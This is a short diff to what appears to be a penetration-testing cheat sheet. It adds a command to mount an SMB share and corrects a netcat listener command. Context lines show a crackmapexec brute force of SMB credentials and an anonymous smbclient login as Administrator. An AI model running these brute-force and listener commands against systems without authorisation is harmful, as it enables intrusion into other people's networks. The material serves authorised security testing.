@@ -232,6 +232,9 @@ smbclient -N \\\\{IP ADDRESS}\\{SHARE} -U Administrator
 # Brute force SMB user and password list
 crackmapexec smb {IP ADDRESS} -u {USER.txt} -p {PASSWORDS.txt} --shares
 
+# Mount SMB Drive
+sudo mount -t cifs //{IP ADDRESS}/{SHARE} /mnt/user/
+
 # {IP ADDRESS}:   IP Address of the Server
 # {SHARE}:        Share name to connect
 # {USER.txt}:     User list to be brute forced
@@ -519,7 +522,7 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 # Download: Pre-installed on Kali Linux
 
 # Usage
-sudo nc –lnvp {PORT}
+sudo nc -lnvp {PORT}
 
 # {PORT}: Select the port used to listen
 ```
